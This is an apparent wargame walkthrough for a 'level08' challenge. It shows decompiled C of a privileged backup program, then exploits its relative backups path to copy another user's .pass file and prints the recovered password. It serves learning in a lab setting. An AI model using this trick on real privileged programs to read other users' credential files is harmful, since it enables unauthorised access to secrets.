# Walkthrough

## Reversing

```c
void log_wrapper(FILE *param_1,char *param_2,char *param_3)
{
  char cVar1;
  size_t sVar2;
  ulong uVar3;
  ulong uVar4;
  char *pcVar5;
  long in_FS_OFFSET;
  byte bVar6;
  undefined8 local_120;
  char local_118 [264];
  long local_10;

  bVar6 = 0;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_120 = param_1;
  strcpy(local_118,param_2);
  uVar3 = 0xffffffffffffffff;
  pcVar5 = local_118;
  do {
    if (uVar3 == 0) break;
    uVar3 = uVar3 - 1;
    cVar1 = *pcVar5;
    pcVar5 = pcVar5 + (ulong)bVar6 * -2 + 1;
  } while (cVar1 != '\0');
  uVar4 = 0xffffffffffffffff;
  pcVar5 = local_118;
  do {
    if (uVar4 == 0) break;
    uVar4 = uVar4 - 1;
    cVar1 = *pcVar5;
    pcVar5 = pcVar5 + (ulong)bVar6 * -2 + 1;
  } while (cVar1 != '\0');
  snprintf(local_118 + (~uVar4 - 1),0xfe - (~uVar3 - 1),param_3);
  sVar2 = strcspn(local_118,"\n");
  local_118[sVar2] = '\0';
  fprintf(local_120,"LOG: %s\n",local_118);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

int main(int argc,char **argv)
{
  char cVar1;
  long lVar2;
  int __fd;
  int iVar3;
  FILE *flog;
  FILE *__stream;
  ulong uVar4;
  char *pcVar5;
  long in_FS_OFFSET;
  byte bVar6;
  char local_79;
  char dir [8];

  bVar6 = 0;
  lVar2 = *(long *)(in_FS_OFFSET + 0x28);
  local_79 = -1;
  if (argc != 2) {
    printf("Usage: %s filename\n",*argv);
  }
  flog = fopen("./backups/.log","w");
  if (flog == (FILE *)0x0) {
    printf("ERROR: Failed to open %s\n","./backups/.log");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  log_wrapper(flog,"Starting back up: ",argv[1]);
  __stream = fopen(argv[1],"r");
  if (__stream == (FILE *)0x0) {
    printf("ERROR: Failed to open %s\n",argv[1]);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  dir[0] = '.';
  dir[1] = '/';
  dir[2] = 'b';
  dir[3] = 'a';
  dir[4] = 'c';
  dir[5] = 'k';
  dir[6] = 'u';
  dir[7] = 'p';
  uVar4 = 0xffffffffffffffff;
  pcVar5 = dir;
  do {
    if (uVar4 == 0) break;
    uVar4 = uVar4 - 1;
    cVar1 = *pcVar5;
    pcVar5 = pcVar5 + (ulong)bVar6 * -2 + 1;
  } while (cVar1 != '\0');
  strncat(dir,argv[1],99 - (~uVar4 - 1));
  __fd = open(dir,0xc1,0x1b0);
  if (__fd < 0) {
    printf("ERROR: Failed to open %s%s\n","./backups/",argv[1]);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  while( true ) {
    iVar3 = fgetc(__stream);
    local_79 = (char)iVar3;
    if (local_79 == -1) break;
    write(__fd,&local_79,1);
  }
  log_wrapper(flog,"Finished back up ",argv[1]);
  fclose(__stream);
  close(__fd);
  if (lVar2 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

This program is actually pretty simple, it's just a program to create
a backup of a file (`argv[1]`).

It opens the file and saves it into `./backups`.

The route for the backup file is relative, `./backup/.log`, but the file from
which read, it's just `argv[1]`, so we could pass the `level09/.pass` then.

## Explotation

Let's try to create a backup of the `.pass` file:
```bash
$ ./level08 '/home/users/level09/.pass'
ERROR: Failed to open ./backups//home/users/level09/.pass
```

Predictable, we don't have any perms in our home, let's move to our working
dir: `/dev/shm`:
```bash
$ /home/users/level08/level08 '/home/users/level09/.pass'
ERROR: Failed to open ./backups/.log
```

We don't have a `backups` dir, so understandable, let's try again:
```bash
$ mkdir backups
$ /home/users/level08/level08 '/home/users/level09/.pass'
ERROR: Failed to open ./backups//home/users/level09/.pass
```

Understandable, let's create that dir also:
```bash
$ mkdir -p ./backups/home/users/level09
$ /home/users/level08/level08 '/home/users/level09/.pass'
$ cat ./backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

Okey... The last level was a prank, like the one in `rainfall`, but it's
important to know things like these are also vulnerable.
